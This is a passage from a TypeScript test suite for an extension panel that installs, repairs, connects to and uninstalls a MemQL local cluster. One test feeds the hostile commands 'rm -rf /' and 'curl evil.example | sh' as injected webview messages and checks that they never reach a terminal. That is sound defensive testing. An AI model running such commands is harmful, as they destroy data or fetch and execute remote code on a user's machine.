  const h = await open({ runner: await fakeRunner({ "install.dockerAccess": 5 }) });
  try {
    beginInstall(h);
    await until(() => /data-act="retry"/.test(h.html()), "the failed screen");
    const before = h.runner.calls.length;
    h.runner.failing.clear();
    h.post({ type: "retry" });
    await until(() => h.runner.calls.length > before, "a second invocation");
    await until(() => INSTALLED.test(h.html()), "the run to settle");
  } finally {
    h.close();
  }
});

test("a settled failure keeps Retry, names the step, and never claims to be finished", async () => {
  const h = await open({ runner: await fakeRunner({ "install.dockerAccess": 5 }) });
  try {
    beginInstall(h);
    await until(() => /data-act="retry"/.test(h.html()), "the failed screen");
    const html = h.html();
    assert.match(html, /Couldn't check Docker/);
    assert.deepEqual(barActs(html).slice(-2), ["leave", "retry"], "Cancel, then Retry as the one button");
    assert.doesNotMatch(html, /guided/i);
    assert.doesNotMatch(html, /Nothing further to do/);
    // The log opened itself on the failure.
    assert.doesNotMatch(html, /id="run-logs" hidden/);
  } finally {
    h.close();
  }
});

test("a failure that cannot be fixed by retrying offers no Retry", async () => {
  // Exit 3 is a refusal: retried unchanged it refuses again.
  const h = await open({ runner: await fakeRunner({ "install.dockerAccess": 3 }) });
  try {
    beginInstall(h);
    await until(() => /Couldn't install/.test(h.html()) && !/Finishing other steps/.test(h.html()), "the failed screen");
    assert.doesNotMatch(h.html(), /data-act="retry"/);
    assert.deepEqual(barActs(h.html()), ["leave"]);
  } finally {
    h.close();
  }
});

test("a wave with several failures explains each of them, by the step's name", async () => {
  const h = await open({ runner: await fakeRunner({ "install.binary": 4, "install.hostsEntries": 5 }) });
  try {
    beginInstall(h);
    await until(() => /Couldn't install</.test(h.html()), "the failed screen");
    const html = h.html();
    assert.match(html, /Couldn&#39;t install tools: |Couldn't install tools: /);
    assert.match(html, /Couldn&#39;t add local addresses: |Couldn't add local addresses: /);
  } finally {
    h.close();
  }
});

test("the failure's words are the script's and the fix, never the executor's record", async () => {
  // THE DEFECT: "exit 5: ..." and "the script exited 0 but its verify did not
  // hold: result.x did not satisfy resultTrue" reached the page. They go to
  // the log; the page says what the script said.
  const h = await open({ runner: await fakeRunner({ "install.dockerAccess": 5 }) });
  try {
    beginInstall(h);
    await until(() => /data-act="retry"/.test(h.html()), "the failed screen");
    const html = h.html();
    assert.match(html, /The fake refused install\.dockerAccess\./);
    assert.doesNotMatch(html, /exit 5|verify did not hold|resultTrue|capability/);
  } finally {
    h.close();
  }
});

test("the log opens AT the failed step, not at its tail", async () => {
  const runner = await fakeRunner({ "install.dockerAccess": 5 });
  const inner = runner.run;
  runner.run = async (run) => {
    if (run.capability === "install.detect") run.onLog?.("Platform: darwin/arm64");
    if (run.capability === "install.dockerAccess") run.onLog?.("docker: permission denied");
    return inner(run);
  };
  const h = await open({ runner });
  try {
    beginInstall(h);
    await until(() => /Installing MemQL/.test(h.html()), "the run");
    h.post({ type: "ready" });
    await until(() => shows(h, /data-act="retry"/), "the failure");
    const reset = h.panel.posted
      .filter((m) => (m as { type?: string; reset?: boolean }).type === "log" && (m as { reset?: boolean }).reset === true)
      .at(-1) as { lines: { text: string; anchor?: boolean; label?: string }[] } | undefined;
    assert.ok(reset !== undefined, "the log was re-sent for the failure");
    const anchored = reset.lines.find((l) => l.anchor === true);
    assert.equal(anchored?.text, "docker: permission denied");
    assert.equal(anchored?.label, "Checking Docker");
    assert.ok(
      h.panel.posted.some((m) => (m as { type?: string; id?: string; open?: boolean }).type === "setDisclosure" && (m as { open?: boolean }).open === true),
      "and the disclosure was opened",
    );
  } finally {
    h.close();
  }
});

/** A runner whose named capability fails carrying a remedy in its envelope. */
async function runnerFailingWithRemedy(capability: string, remedy: string): Promise<FakeRunner> {
  return fakeRunner({ [capability]: 4 }, { [capability]: { remedy } });
}

test("a failure that names a remedy offers to run it in a terminal", async () => {
  const remedy = "sudo usermod -aG docker ada";
  const h = await open({ runner: await runnerFailingWithRemedy("install.dockerAccess", remedy) });
  try {
    beginInstall(h);
    await until(() => /data-act="remedy"/.test(h.html()), "the remedy control");
    assert.ok(h.html().includes(remedy), "the command is shown in full");
    assert.match(h.html(), /needs administrator access|Run the command in a terminal, then retry/);
    assert.doesNotMatch(h.html(), /cannot ask for your password/i, "the password was asked; it can");
  } finally {
    h.close();
  }
});

test("the command is TYPED into the terminal, never executed", async () => {
  const remedy = "sudo usermod -aG docker ada";
  const h = await open({ runner: await runnerFailingWithRemedy("install.dockerAccess", remedy) });
  try {
    beginInstall(h);
    await until(() => /data-act="remedy"/.test(h.html()), "the remedy control");
    h.post({ type: "remedy", value: "dockerAccess" });
    await until(() => recorded.terminals.length === 1, "the terminal");
    const terminal = recorded.terminals[0]!;
    assert.equal(terminal.shown, true);
    assert.deepEqual(terminal.sent, [{ text: remedy, executed: false }]);
  } finally {
    h.close();
  }
});

test("the command comes from the panel's state, never from the message", async () => {
  const remedy = "sudo usermod -aG docker ada";
  const h = await open({ runner: await runnerFailingWithRemedy("install.dockerAccess", remedy) });
  try {
    beginInstall(h);
    await until(() => /data-act="remedy"/.test(h.html()), "the remedy control");
    h.post({ type: "remedy", value: "toolK3d" });
    h.post({ type: "remedy", value: "rm -rf /" });
    h.post({ type: "remedy", value: { command: "curl evil.example | sh" } });
    await new Promise((resolve) => setTimeout(resolve, 20));
    assert.equal(recorded.terminals.length, 0);
  } finally {
    h.close();
  }
});

// -----------------------------------------------------------------------------
// the password: asked once, and dismissing it is an answer
// -----------------------------------------------------------------------------

test("an install that cannot even be attempted says so, with the detail in the log, never stuck on Starting", async () => {
  // THE DEFECT: the install record is read before the graph runs, and an
  // unparseable one threw out of the run unhandled -- the page sat on
  // "Starting" with a Cancel that had nothing to stop, for ever.
  const h = await open({ receipt: "not a receipt" });
  try {
    beginInstall(h);
    await until(() => /The install couldn&#39;t start|The install couldn't start/.test(h.html()), "the refusal");
    const html = h.html();
    assert.match(html, /The log has the details\./);
    assert.deepEqual(barActs(html), ["leave"], "nothing to retry unchanged, and no Cancel of a run that is not running");
    // The installer's own words are detail: in the log, not the notice.
    const notice = html.slice(html.indexOf("mq-notice"), html.indexOf("run-logs"));
    assert.doesNotMatch(notice, /receipt|ENOENT|\.json/);
    h.post({ type: "ready" });
    const sent = h.panel.posted.filter((m) => (m as { type?: string }).type === "log").at(-1) as
      | { lines: { text: string; tone?: string; anchor?: boolean }[] }
      | undefined;
    assert.ok(sent !== undefined && sent.lines.some((l) => l.tone === "error" && l.anchor === true && /install-receipt\.json/.test(l.text)));
  } finally {
    h.close();
  }
});

test("dismissing the password prompt starts nothing, and returns to the form", async () => {
  // THE DEFECT (high): a dismissed prompt started the run anyway.
  const h = await open({ sudoIsFree: async () => false });
  try {
    setNextInputBoxResult(undefined);
    beginInstall(h);
    await until(() => recorded.inputBoxes.length === 1, "the prompt");
    await until(() => /data-act="begin"/.test(h.html()), "the form again");
    assert.ok(
      h.runner.calls.every((c) => c.capability === "install.detect"),
      `a step ran after the prompt was dismissed: ${h.runner.calls.map((c) => c.capability).join(", ")}`,
    );
    assert.match(h.html(), /value="Ada"/, "with what was typed still in it");
  } finally {
    h.close();
  }
});

test("the password prompt says what it is for, in the person's words", async () => {
  const h = await open({ sudoIsFree: async () => false });
  try {
    setNextInputBoxResult(undefined);
    beginInstall(h);
    await until(() => recorded.inputBoxes.length === 1, "the prompt");
    const box = recorded.inputBoxes[0]!;
    assert.equal(box["title"], "MemQL needs your password");
    assert.equal(box["placeHolder"], "Your computer password");
    assert.doesNotMatch(String(box["prompt"]), /sudo|--/);
  } finally {
    h.close();
  }
});

// -----------------------------------------------------------------------------
// the hand-off and the done screen
// -----------------------------------------------------------------------------

test("a completed install registers the cluster, quietly, and offers one next act", async () => {
  const h = await open({});
  try {
    beginInstall(h);
    await until(() => INSTALLED.test(h.html()), "the done screen");
    const html = h.html();
    assert.ok(fs.existsSync(h.clustersPath), "the cluster must land in the registry");
    assert.ok(recorded.executed.includes("memql.clusters.refresh"));
    // THE MODAL OVER THE DONE SCREEN: select used to pop "Set up now" over
    // this page and its one-time key. The hand-off selects quietly.
    const select = recorded.executed.indexOf("memql.clusters.select");
    assert.ok(select >= 0);
    assert.equal((recorded.executedArgs[select]![0] as { quiet?: boolean }).quiet, true);
    // One button, and Back as a quiet way off (the landing looks again).
    assert.equal(primaries(html), 1, "exactly one primary");
    assert.deepEqual(barActs(html), ["back", "signIn"]);
    assert.match(html, /api\.memql\.localhost:443/);
    assert.match(html, /https:\/\/os\.memql\.localhost\//);
  } finally {
    h.close();
  }
});

async function runToDoneWithOwner(): Promise<Harness> {
  const runner = await fakeRunner({}, { "install.enrolmentLink": { ownerClaimed: true, enrolmentState: "minted" } });
  const h = await open({ runner });
  beginInstall(h);
  await until(() => INSTALLED.test(h.html()), "the run to settle");
  return h;
}

test("an owner account to enrol against adds Set up a passkey beside Sign in", async () => {
  // ONE NEXT ACT: Sign in. The sign-in command itself routes a fresh owner to
  // passkey enrolment (memql#3906), so the passkey set-up is a quiet act
  // beside it rather than a second primary.
  const h = await runToDoneWithOwner();
  try {
    const html = h.html();
    assert.deepEqual(barActs(html), ["back", "enrolPasskey", "signIn"]);
    assert.match(html, /class="mq-textbtn" data-act="enrolPasskey"/);
    assert.match(html, /class="mq-btn" data-tone="primary" data-act="signIn"/);
    h.post({ type: "enrolPasskey" });
    await until(() => recorded.executed.includes("memql.clusters.takeOwnership"), "the enrolment");
  } finally {
    h.close();
  }
});

test("no enrolment credential reaches the webview", async () => {
  const h = await runToDoneWithOwner();
  try {
    const html = h.html();
    assert.match(html, /data-act="enrolPasskey"/, "the enrolment must actually be on screen");
    assert.ok(!html.includes("mql_enr_"));
    assert.ok(!/href=/.test(html));
  } finally {
    h.close();
  }
});

test("signed in already, the done screen's one act is MemQL OS", async () => {
  const h = await open({ isSignedIn: () => true });
  try {
    beginInstall(h);
    await until(() => INSTALLED.test(h.html()), "the done screen");
    assert.deepEqual(barActs(h.html()), ["back", "openOs"]);
    h.post({ type: "openOs" });
    await until(() => recorded.executed.includes("memql.clusters.openConsole"), "MemQL OS");
  } finally {
    h.close();
  }
});

test("Connect to it adds the cluster with nothing typed, signs in, and claims no reachability", async () => {
  const h = await open({
    verdict: "installed-unreachable",
    receipt: {
      version: 1,
      graph: "install",
      startedAt: "2026-08-01T00:00:00Z",
      updatedAt: "2026-08-01T00:00:00Z",
      entries: [
        {
          stepId: "seedBootstrap",
          script: "install/seed-bootstrap.sh",
          receipt: "",
          preExisting: false,
          params: { domain: "lab.example.com" },
          result: {},
          changed: true,
          recordedAt: "2026-08-01T00:00:00Z",
        },
      ],
    },
  });
  try {
    await until(() => /data-value="reconnect"/.test(h.html()), "the landing");
    h.post({ type: "choose", value: "reconnect" });
    await until(() => /Local cluster added/.test(h.html()), "the done screen");
    const html = h.html();
    assert.doesNotMatch(html, /<input|<select/, "not one box");
    // THE DEFECT: "answers at" was said of a cluster offered precisely because
    // it was not answering.
    assert.doesNotMatch(html, /answers at|is reachable|is running/);
    const written = fs.readFileSync(h.clustersPath, "utf8");
    assert.match(written, /name: lab/);
    assert.match(written, /endpoint: api\.lab\.example\.com:443/);
    assert.match(written, /local: true/);
    await until(() => recorded.executed.includes("memql.clusters.signIn"), "then the sign in");
  } finally {
    h.close();
  }
});

const RECOVERY_KEY = `mql_rec_${"R".repeat(43)}`;

async function runToDoneWithRecovery(
  state: string,
  key: string,
  over: { confirmDestructive?: (prompt: DestructiveConfirmation) => Promise<boolean> } = {},
): Promise<Harness> {
  const runner = await fakeRunner({}, { "install.recoveryKey": { recoveryKey: key, recoveryKeyState: state } });
  const h = await open({ runner, ...over });
  beginInstall(h);
  await until(() => INSTALLED.test(h.html()), "the run to settle");
  return h;
}

function answering(answer: boolean): {
  prompts: DestructiveConfirmation[];
  confirmDestructive: (prompt: DestructiveConfirmation) => Promise<boolean>;
} {
  const prompts: DestructiveConfirmation[] = [];
  return {
    prompts,
    confirmDestructive: async (prompt) => {
      prompts.push(prompt);
      return answer;
    },
  };
}

test("the claimed recovery key is shown once, behind Show, with Copy beside it", async () => {
  const h = await runToDoneWithRecovery("claimed", RECOVERY_KEY);
  try {
    const before = h.html();
    assert.ok(!before.includes(RECOVERY_KEY), "the plaintext must not render before it is asked for");
    assert.match(before, /data-act="revealRecoveryKey"/);
    assert.match(before, /data-act="copyRecoveryKey"/, "and it can be copied without being shown");
    assert.match(before, /Shown once/);
    assert.doesNotMatch(before, /portal|hash|break-glass|minted/i);
    h.post({ type: "revealRecoveryKey" });
    assert.ok(h.html().includes(RECOVERY_KEY));
    assert.equal(primaries(h.html()), 1, "the reveal is not a second primary");
  } finally {
    h.close();
  }
});

test("the reveal is DISPLAY, not storage: the receipt and the run log still withhold", async () => {
  const h = await runToDoneWithRecovery("claimed", RECOVERY_KEY);
  try {
    h.post({ type: "revealRecoveryKey" });
    assert.ok(h.html().includes(RECOVERY_KEY));
    const receipt = fs.readFileSync(h.receiptFile, "utf8");
    assert.ok(!receipt.includes(RECOVERY_KEY));
    assert.ok(receipt.includes("[withheld: single-use credential]"));
    const runsDir = path.join(path.dirname(h.receiptFile), "runs");
    let sawWithheldKey = false;
    for (const dirent of fs.readdirSync(runsDir, { recursive: true, withFileTypes: true })) {
      if (!dirent.isFile()) continue;
      const content = fs.readFileSync(path.join(dirent.parentPath, dirent.name), "utf8");
      assert.ok(!content.includes(RECOVERY_KEY));
      if (content.includes("recoveryKey=[withheld: single-use credential]")) sawWithheldKey = true;
    }
    assert.ok(sawWithheldKey);
  } finally {
    h.close();
  }
});

test("a key claimed on an earlier run renders the fact, and points nowhere retired", async () => {
  const h = await runToDoneWithRecovery("alreadyClaimed", "");
  try {
    const html = h.html();
    assert.match(html, /saved during an earlier install/);
    assert.doesNotMatch(html, /portal/i);
    assert.ok(!html.includes('data-act="copyRecoveryKey"'));
  } finally {
    h.close();
  }
});

test("a cluster with no owner yet says when the key will exist", async () => {
  const h = await runToDoneWithRecovery("awaitingOwner", "");
  try {
    assert.match(h.html(), /created after you first sign in/);
    assert.ok(!h.html().includes('data-act="copyRecoveryKey"'));
  } finally {
    h.close();
  }
});

test("Back on an uncopied recovery key asks first, and a refusal changes nothing", async () => {
  const asked = answering(false);
  const h = await runToDoneWithRecovery("claimed", RECOVERY_KEY, asked);
  try {
    h.post({ type: "revealRecoveryKey" });
    h.post({ type: "back" });
    await until(() => asked.prompts.length > 0, "the confirmation");
    const prompt = asked.prompts[0]!;
    assert.match(prompt.message, /recovery key/i);
    assert.match(prompt.detail, /can't be shown again/);
    assert.equal(prompt.proceed, "Leave");
    assert.match(h.html(), INSTALLED);
    assert.ok(h.html().includes(RECOVERY_KEY));
  } finally {
    h.close();
  }
});

test("Back that is confirmed does go back, and does let go of the key", async () => {
  const asked = answering(true);
  const h = await runToDoneWithRecovery("claimed", RECOVERY_KEY, asked);
  try {
    h.post({ type: "revealRecoveryKey" });
    h.post({ type: "back" });
    await until(() => !INSTALLED.test(h.html()), "the landing");
    assert.equal(asked.prompts.length, 1);
    assert.ok(!h.html().includes(RECOVERY_KEY));
  } finally {
    h.close();
  }
});

test("a copy that FAILED is not a copy: Back still asks", async () => {
  const asked = answering(false);
  const h = await runToDoneWithRecovery("claimed", RECOVERY_KEY, asked);
  try {
    h.post({ type: "copyRecoveryKey" });
    await until(() => recorded.errors.some((e) => /Couldn't copy the recovery key/.test(e)), "the refusal");
    assert.doesNotMatch(h.html(), />Copied</, "a failed copy is not shown as copied");
    h.post({ type: "back" });
    await until(() => asked.prompts.length > 0, "the confirmation");
  } finally {
    h.close();
  }
});

test("a menu does not navigate away from an uncopied recovery key", async () => {
  const h = await runToDoneWithRecovery("claimed", RECOVERY_KEY);
  try {
    // The Clusters "+" again, on the open panel: revealed, never re-routed.
    AddClusterPanel.show(context(), presenceFor("absent"), {
      diagnostics: { appendLine: () => {} },
      clustersPath: h.clustersPath,
      receiptFile: h.receiptFile,
      installRoot: REPO_ROOT,
      refreshTree: () => undefined,
      removeRegistryEntry: async () => undefined,
      runScript: h.runner.run,
    }, "uninstall");
    await new Promise((resolve) => setTimeout(resolve, 20));
    assert.match(h.html(), INSTALLED);
  } finally {
    h.close();
  }
});

test("closing the panel on an uncopied key says the key is gone, and that it can be replaced", async () => {
  const h = await runToDoneWithRecovery("claimed", RECOVERY_KEY);
  h.close();
  const warning = recorded.warnings.find((w) => /recovery key/i.test(w));
  assert.ok(warning !== undefined);
  assert.match(warning, /An owner can replace it later/);
  // NO SCREEN THAT IS NOT THERE: MemQL OS has no recovery-key page, and the
  // portal is retired. A pointer to either sends a person looking for nothing.
  assert.doesNotMatch(warning, /portal|hash|wizard|MemQL OS|under Users/);
  assert.ok(!warning.includes(RECOVERY_KEY));
});

test("closing a screen that is holding no plaintext says nothing", async () => {
  const h = await runToDoneWithRecovery("alreadyClaimed", "");
  h.close();
  assert.deepEqual(recorded.warnings.filter((w) => /recovery key/i.test(w)), []);
});

test("the reveal guard re-arms for the next run, not once per panel", async () => {
  const asked = answering(true);
  const runner = await fakeRunner({}, { "install.recoveryKey": { recoveryKey: RECOVERY_KEY, recoveryKeyState: "claimed" } });
  const live = livePresence();
  const h = await open({ runner, confirmDestructive: asked.confirmDestructive, presence: live.presence });
  live.bind(h);
  try {
    beginInstall(h);
    await until(() => INSTALLED.test(h.html()), "the first run");
    h.post({ type: "revealRecoveryKey" });
    assert.ok(h.html().includes(RECOVERY_KEY));
    h.post({ type: "back" });
    await until(() => !INSTALLED.test(h.html()), "the landing");
    // The landing looks again, and the install left a cluster: Repair is the run now.
    await until(() => /data-value="repair"|data-value="signIn"/.test(h.html()), "the landing's choices");
    h.post({ type: "choose", value: "repair" });
    await until(() => /data-act="begin"/.test(h.html()), "the repair form");
    type(h, "ownerFirstName", "Ada");
    type(h, "ownerLastName", "Lovelace");
    type(h, "ownerEmail", "ada@example.com");
    h.post({ type: "begin" });
    await until(() => /MemQL is repaired/.test(h.html()), "the second run");
    assert.ok(!h.html().includes(RECOVERY_KEY), "the second run's key is behind a click too");
    assert.match(h.html(), /data-act="revealRecoveryKey"/);
  } finally {
    h.close();
  }
});

// -----------------------------------------------------------------------------
// closing mid-run keeps today's abort (memql#4614)
// -----------------------------------------------------------------------------

test("closing the page mid-run aborts the run rather than orphaning it", async () => {
  const runner = await fakeRunner();
  const gate = gateOn(runner, "install.dockerAccess");
  const h = await open({ runner });
  try {
    beginInstall(h);
    await until(gate.reached, "the run to reach a step inside the graph");
    h.close();
    gate.release();
    await until(() => runner.calls.some((c) => c.capability === "install.dockerAccess"), "the gated step to finish");
    for (let i = 0; i < 100; i += 1) await new Promise((resolve) => setTimeout(resolve, 1));
    const ran = runner.calls.map((c) => c.capability);
    for (const capability of ["install.hostsEntries", "install.nssTools", "install.mkcert", "k3d.up", "install.seedBootstrap", "install.recoveryKey"]) {
      assert.ok(!ran.includes(capability), `${capability} ran after the page was closed: ${ran.join(", ")}`);
    }
  } finally {
    gate.release();
    h.close();
  }
});

// -----------------------------------------------------------------------------
// connect to a cluster elsewhere
// -----------------------------------------------------------------------------

test("Escape leaves an empty connect form, and keeps a half-filled one", async () => {
  // THE DEFECT: Escape in any field discarded every answer.
  const h = await open({});
  try {
    await until(() => /data-value="connect"/.test(h.html()), "the landing");
    h.post({ type: "choose", value: "connect" });
    type(h, "connectName", "staging");
    h.post({ type: "connectEscape" });
    await new Promise((resolve) => setTimeout(resolve, 10));
    assert.match(h.html(), /Connect to a cluster/);
    assert.match(h.html(), /value="staging"/, "Escape wiped the draft");
    type(h, "connectName", "");
    h.post({ type: "connectEscape" });
    await until(() => /data-value="connect"/.test(h.html()), "the landing");
  } finally {
    h.close();
  }
});

test("the connect form says what it will connect to, as it is typed", async () => {
  const h = await open({});
  try {
    await until(() => /data-value="connect"/.test(h.html()), "the landing");
    h.post({ type: "choose", value: "connect" });
    type(h, "connectDomain", "staging.example.com");
    assert.match(h.html(), /Connects to api\.staging\.example\.com:443/);
    assert.doesNotMatch(h.html(), /clusters\.yaml|gRPC|JWT|front door|portal/);
  } finally {
    h.close();
  }
});

test("a connected cluster stays on the page with Sign in, not a toast", async () => {
  const h = await open({ probeCluster: async () => ({ ok: true }) });
  try {
    await until(() => /data-value="connect"/.test(h.html()), "the landing");
    h.post({ type: "choose", value: "connect" });
    type(h, "connectName", "staging");
    type(h, "connectDomain", "staging.example.com");
    h.post({ type: "connect" });
    await until(() => /data-act="signIn"/.test(h.html()), "the added screen");
    assert.match(h.html(), /api\.staging\.example\.com:443/);
    assert.deepEqual(recorded.infos, [], "no toast: the page carries the next act");
    assert.match(fs.readFileSync(h.clustersPath, "utf8"), /name: staging/);
    h.post({ type: "signIn" });
    await until(() => recorded.executed.includes("memql.clusters.signIn"), "the sign in");
    // Back, then Connect again: an empty form, not the one just saved (whose
    // name is now taken).
    assert.deepEqual(barActs(h.html()), ["back", "signIn"]);
    h.post({ type: "back" });
    await until(() => /data-value="connect"/.test(h.html()), "the landing");
    h.post({ type: "choose", value: "connect" });
    await until(() => /data-field="connectName"/.test(h.html()), "the form");
    assert.doesNotMatch(h.html(), /value="staging"/, "the saved cluster's answers came back");
  } finally {
    h.close();
  }
});

test("a cluster that does not answer is added only on a second, informed press", async () => {
  const h = await open({});
  try {
    await until(() => /data-value="connect"/.test(h.html()), "the landing");
    h.post({ type: "choose", value: "connect" });
    type(h, "connectName", "staging");
    type(h, "connectDomain", "staging.example.com");
    h.post({ type: "connect" });
    await until(() => /Add anyway/.test(h.html()), "the warning");
    assert.match(h.html(), /Can&#39;t reach api\.staging\.example\.com:443\.|Can't reach api\.staging\.example\.com:443\./);
    assert.ok(!fs.existsSync(h.clustersPath), "nothing is written on the first press");
    h.post({ type: "connect" });
    await until(() => fs.existsSync(h.clustersPath), "the second press writes");
  } finally {
    h.close();
  }
});

// -----------------------------------------------------------------------------
// uninstall
// -----------------------------------------------------------------------------

/** What an install that created everything records, as far as the removals read it. */
function fullReceipt(opts: { clusterPreExisting?: boolean } = {}): unknown {
  const entry = (stepId: string, receipt: string, result: Record<string, string>, preExisting = false) => ({
    stepId,
    script: "x",
    receipt,
    preExisting,
    params: {},
    result,
    changed: true,
    recordedAt: "2026-09-01T00:00:00Z",
  });
  return {
    version: 1,
    graph: "install",
    startedAt: "2026-09-01T00:00:00Z",
    updatedAt: "2026-09-01T00:00:00Z",
    entries: [
      entry("toolK3d", "binary", { path: path.join(HOME, ".memql", "bin", "k3d") }),
      entry("toolKubectl", "binary", { path: path.join(HOME, ".memql", "bin", "kubectl") }),
      entry("toolMkcert", "binary", { path: path.join(HOME, ".memql", "bin", "mkcert") }),
      entry("hostsBlock", "hostsEntries", { hostsFile: "/etc/hosts" }),
      entry("localCA", "mkcertCA", { caroot: path.join(HOME, ".memql", "mkcert") }),
      entry("stackCheckout", "checkout", { dest: path.join(HOME, ".memql", "src") }),
      entry("clusterUp", "stack", { cluster: "memql" }, opts.clusterPreExisting === true),
    ],
  };
}

async function openUninstall(over: OpenOptions = {}): Promise<Harness> {
  const h = await open({
    verdict: "installed-healthy",
    registered: true,
    action: "uninstall",
    receipt: fullReceipt(),
    ...over,
  });
  await until(() => /Will be removed|No local cluster was found/.test(h.html()), "the preview");
  return h;
}

test("the preview names what goes by name, shared tools as switches, off", async () => {
  const h = await openUninstall();
  try {
    const html = h.html();
    assert.equal(h.panel.title, "Uninstall MemQL");
    assert.match(html, /The cluster<\/span><span class="ac-row-detail">memql, and everything running in it/);
    assert.match(html, /Downloaded MemQL files/);
    assert.match(html, /Asks for your password/);
    // THE SHARED TOOLS: switches, by friendly name, off -- never a raw path or
    // a param key (the old rows read "path /Users/<you>/.memql/bin/k3d").
    for (const name of ["k3d", "kubectl", "Local certificate authority", "mkcert"]) {
      assert.match(html, new RegExp(`class="mq-switch-label"[^>]*>${name}<`));
    }
    assert.doesNotMatch(html, /type="checkbox"(?![^>]*role="switch")/, "an on/off choice is a switch");
    assert.doesNotMatch(html, /path \/|caroot |\/Users\/|hosts-file /);
    assert.doesNotMatch(html, /<input[^>]*\schecked[\s>]/, "every switch starts off");
    assert.deepEqual(barActs(html), ["uninstallBack", "uninstallStart"]);
  } finally {
    h.close();
  }
});

test("mkcert cannot be chosen without the certificate authority it withdraws", async () => {
  // THE DEFECT: mkcert alone was skipped "for want of removeLocalCA" and said
  // nothing -- mkcert is what withdraws the authority, so removing it first
  // would leave nothing able to.
  const h = await openUninstall();
  try {
    assert.match(h.html(), /id="shared-removeToolMkcert" disabled/);
    assert.match(h.html(), /Turn on local certificate authority first\./);
    h.post({ type: "shared", id: "shared-removeToolMkcert", checked: true, value: "removeToolMkcert" });
    assert.doesNotMatch(h.html(), /id="shared-removeToolMkcert" checked/, "mkcert was switched on alone");
    h.post({ type: "shared", id: "shared-removeLocalCA", checked: true, value: "removeLocalCA" });
    // The press while it was unavailable was REFUSED, not remembered: turning
    // the authority on must not bring mkcert on with it, unasked.
    assert.doesNotMatch(h.html(), /id="shared-removeToolMkcert" checked/, "a refused press came back on by itself");
    h.post({ type: "shared", id: "shared-removeToolMkcert", checked: true, value: "removeToolMkcert" });
    assert.match(h.html(), /id="shared-removeToolMkcert" checked/);
    // Turning the authority off takes mkcert with it.
    h.post({ type: "shared", id: "shared-removeLocalCA", checked: false, value: "removeLocalCA" });
    assert.doesNotMatch(h.html(), /id="shared-removeToolMkcert" checked/);
  } finally {
    h.close();
  }
});

test("an uninstall starts only from its preview: a stale Uninstall after the removal runs nothing", async () => {
  const h = await openUninstall();
  try {
    h.post({ type: "uninstallStart" });
    await until(() => /MemQL is uninstalled/.test(h.html()), "the removal");
    const calls = h.runner.calls.length;
    h.post({ type: "uninstallStart" });
    await new Promise((resolve) => setTimeout(resolve, 20));
    assert.equal(h.runner.calls.length, calls, "a second removal started from the finished screen");
    assert.match(h.html(), /MemQL is uninstalled/);
  } finally {
    h.close();
  }
});

test("switched-off tools are skipped and switched-on ones removed", async () => {
  const h = await openUninstall();
  try {
    h.post({ type: "shared", id: "shared-removeToolK3d", checked: true, value: "removeToolK3d" });
    h.post({ type: "uninstallStart" });
    await until(() => /MemQL is uninstalled/.test(h.html()), "the removal");
    const removed = h.runner.calls
      .filter((c) => c.capability === "install.removeArtifact")
      .map((c) => `${c.params["kind"]}:${path.basename(c.params["path"] ?? c.params["cluster"] ?? c.params["caroot"] ?? "")}`);
    assert.ok(removed.includes("binary:k3d"), removed.join(", "));
    assert.ok(!removed.includes("binary:kubectl"), "a tool left off was removed");
    assert.ok(!removed.some((r) => r.startsWith("mkcertCA")), "the authority left off was removed");
  } finally {
    h.close();
  }
});

test("delete-data: the phrase appears with the switch, answers live, and alone permits the act", async () => {
  const h = await openUninstall({ receipt: fullReceipt({ clusterPreExisting: true }) });
  try {
    assert.match(h.html(), /Kept unless you delete its data/);
    assert.doesNotMatch(h.html(), /data-field="deletePhrase"/, "no phrase before the switch is on");
    h.post({ type: "deleteData", id: "delete-data", checked: true });
    assert.match(h.html(), /Type &quot;delete memql data&quot; to confirm|Type "delete memql data" to confirm/);
    assert.ok(!barActs(h.html()).includes("uninstallStart"), "no act until the phrase matches");
    type(h, "deletePhrase", "delete memql");
    assert.match(h.html(), /Doesn&#39;t match yet\.|Doesn't match yet\./);
    assert.ok(!barActs(h.html()).includes("uninstallStart"));
    type(h, "deletePhrase", "delete memql data");
    assert.match(h.html(), /data-act="uninstallStart"[^>]*>Uninstall and delete data</);
    // The cluster moved from Kept to Will be removed.
    assert.doesNotMatch(h.html(), /Kept unless you delete its data/);
    // Off clears the phrase: consent does not survive the switch.
    h.post({ type: "deleteData", id: "delete-data", checked: false });
    h.post({ type: "deleteData", id: "delete-data", checked: true });
    assert.doesNotMatch(h.html(), /value="delete memql data"/);
  } finally {
    h.close();
  }
});

test("consents do not survive Cancel: the next preview starts with every switch off", async () => {
  const h = await openUninstall({ receipt: fullReceipt({ clusterPreExisting: true }) });
  try {
    h.post({ type: "shared", id: "shared-removeToolK3d", checked: true, value: "removeToolK3d" });
    h.post({ type: "deleteData", id: "delete-data", checked: true });
    type(h, "deletePhrase", "delete memql data");
    h.post({ type: "uninstallBack" });
    await until(() => /data-value="uninstall"/.test(h.html()), "the landing");
    h.post({ type: "choose", value: "uninstall" });
    await until(() => /Will be removed/.test(h.html()), "the preview again");
    assert.doesNotMatch(h.html(), /<input[^>]*\schecked[\s>]/, "a switch came back on");
    assert.doesNotMatch(h.html(), /delete memql data"/);
    assert.ok(!barActs(h.html()).includes("uninstallStart") || !/and delete data/.test(h.html()));
  } finally {
    h.close();
  }
});

test("a cluster with no install record (make up, or adopted) can be uninstalled from here", async () => {
  // THE OWNER'S MACHINE: a `local: true` list entry, a live k3d `memql`, and
  // no receipt. The preview used to refuse ("no receipt at ...") -- a dead end
  // behind an Uninstall the landing offered. It is the one removal the
  // observation supports, kept unless its data is deleted, and that needs the
  // switch and the phrase.
  const removed: string[] = [];
  const presence = presenceFor("installed-healthy", { registered: true, overrides: { readReceiptFile: async () => null } });
  const h = await open({
    presence,
    action: "uninstall",
    listLocalClusters: async () => ["memql"],
    removeRegistryEntry: async (name) => void removed.push(name),
  });
  try {
    await until(() => /Will be removed/.test(h.html()), "the preview");
    const html = h.html();
    assert.doesNotMatch(html, /receipt|No local cluster was found/);
    assert.match(html, /Kept unless you delete its data/);
    assert.ok(!barActs(html).includes("uninstallStart"), "an Uninstall that would remove nothing");
    h.post({ type: "deleteData", id: "delete-data", checked: true });
    type(h, "deletePhrase", "delete memql data");
    h.post({ type: "uninstallStart" });
    await until(() => /MemQL is uninstalled/.test(h.html()), "the removal");
    const cluster = h.runner.calls.find((c) => c.capability === "install.removeArtifact" && c.params["kind"] === "stack");
    assert.ok(cluster !== undefined, "the cluster removal ran");
    assert.equal(cluster.params["cluster"], "memql");
    assert.equal(cluster.params["confirm"], "delete-memql-data", "the typed consent reached the script");
